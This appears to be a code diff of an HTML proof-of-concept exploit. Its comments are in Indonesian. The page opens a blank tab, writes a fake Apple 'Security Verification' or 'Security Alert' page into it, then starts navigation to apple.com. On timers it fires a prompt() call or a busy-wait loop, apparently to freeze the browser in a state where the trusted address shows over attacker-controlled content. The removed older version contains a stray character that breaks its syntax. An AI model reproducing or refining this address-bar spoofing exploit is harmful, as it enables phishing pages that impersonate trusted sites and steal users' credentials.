@@ -6,73 +6,94 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Bypass Test - Zero</title>
+    <title>PoC Bypass Verification - Zero</title>
     <style>
       body, html {
         margin: 0;
         padding: 0;
         height: 100%;
-        background: #fff;
+        background: #fafafa;
         font-family: -apple-system, BlinkMacSystemFont, sans-serif;
       }
+      .container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100%;
+      }
       button {
-        position: fixed;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
         padding: 20px 40px;
         font-size: 20px;
+        font-weight: bold;
         background: #007aff;
         color: #fff;
         border: none;
-        border-radius: 12px;
+        border-radius: 14px;
         cursor: pointer;
-        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        box-shadow: 0 6px 20px rgba(0, 122, 255, 0.3);
+        transition: transform 0.1s ease;
+      }
+      button:active {
+        transform: scale(0.96);
       }
     </style>
   </head>
   <body>
-    <button id="startBtn">TEST BYPASS CLICK HERE</button>
+    <div class="container">
+      <button id="startBtn">CLICK TO TEST DESYNC</button>
+    </div>
 
     <script>
       document.getElementById("startBtn").onclick = function () {
-        this.remove();
+        this.style.display = 'none';
 
-        // Membuka tab baru dan mencoba memaksa fokus atau interaksi langsung
+        // Membuka tab baru (about:blank)
         const newTab = window.open("about:blank", "_blank");
 
         if (newTab) {
+          // Menyuntikkan konten attacker-controlled ke dalam DOM tab baru
           newTab.document.write(`
             <!DOCTYPE html>
             <html>
-            <head><title>Apple - Official Site</title></head>
-            <body style="margin:0;padding:0;background:#f5f5f7;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center">
+            <head>
+              <title>Apple</title>
+              <meta name="viewport" content="width=device-width, initial-scale=1">
+            </head>
+            <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
               <div>
-                <h1 style="font-size:48px;font-weight:600;color:#1d1d1f;margin:0 0 20px 0">Apple Security Verification</h1>
-                <p style="font-size:24px;color:#86868b;margin:0">Please authenticate to continue.</p>
+                <h1 style="font-size:42px;font-weight:700;color:#1d1d1f;margin:0 0 16px 0;">Security Alert</h1>
+                <p style="font-size:20px;color:#86868b;margin:0;">Verifying trusted origin connection...</p>
               </div>
             </body>
             </html>
           `);
           newTab.document.close();
 
-          // Mempercepat navigasi ke target domain terpercaya
+          // Tahap 1: Memicu navigasi asinkron ke domain target (apple.com)
           setTimeout(() => {
-            newTab.location.href = "https://apple.com";
-          }, 10);
-
-          // Menyesuaikan timing penundaan dialog untuk mencari celah race condition setelah tab aktif
-          setTimeout(function () {
             try {
-              newTab.prompt("BYPASS ROOT CAUSE VERIFICATION");
-            }V catch(e) {
-              // Fallback jika diblokir oleh patch, uji dengan teknik blocking thread alternatif
-              let start = Date.now();
-              while (Date.now() - start < 2000) {
-                // Busy wait untuk membekukan thread utama jika prompt() gagal
+              newTab.location.href = "https://apple.com";
+            } catch (err) {
+              console.error(err);
+            }
+          }, 50);
+
+          // Tahap 2: Memaksa thread blocking/dialog saat jendela transisi visibilitas terbuka
+          setTimeout(() => {
+            try {
+              // Menguji apakah dialog masih bisa dipicu atau diblokir oleh patch baru,
+              // sekaligus memicu sinkronisasi state UI yang macet.
+              newTab.prompt("CRITICAL_DEADLOCK_TRIGGER");
+            } catch (e) {
+              // Fallback: Jika prompt diblokir oleh patch non-visible WebState,
+              // gunakan teknik sinkronus blocking buatan untuk menahan thread utama sesaat.
+              const start = Date.now();
+              while (Date.now() - start < 1500) {
+                // Busy-wait loop untuk mensimulasikan thread stalling
               }
             }
-          }, 300);
+          }, 350);
         }
       };
     </script>
